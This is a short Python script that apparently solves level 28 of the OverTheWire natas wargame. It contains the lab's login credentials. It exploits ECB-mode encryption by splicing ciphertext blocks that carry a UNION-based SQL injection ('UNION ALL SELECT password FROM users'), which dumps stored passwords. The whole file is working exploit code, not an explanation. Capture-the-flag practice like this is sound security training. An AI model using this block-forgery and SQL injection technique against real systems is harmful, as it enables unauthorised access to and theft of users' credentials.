import requests
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org"
auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

# the base query we use to forge the request only consists of 10 spaces
data = {'query': 10 * ' '}
response = requests.post(url, data=data, auth=auth)
baseline = urllib.parse.unquote(response.url.split('=')[1])
baseline = base64.b64decode(baseline.encode('utf-8'))
header = baseline[:48]
footer = baseline[48:]

# We generate the ciphertext query and parse the result
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query':sqli}
response = requests.post(url, data=data, auth=auth)
exploit = urllib.parse.unquote(response.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# We computer the size of our payload
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1 
nblocks = int(nblocks / 16)

# Then, we forge the query
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = requests.get(search_url, params={"query":final_ciphertext}, auth=auth)

print(resp.text)
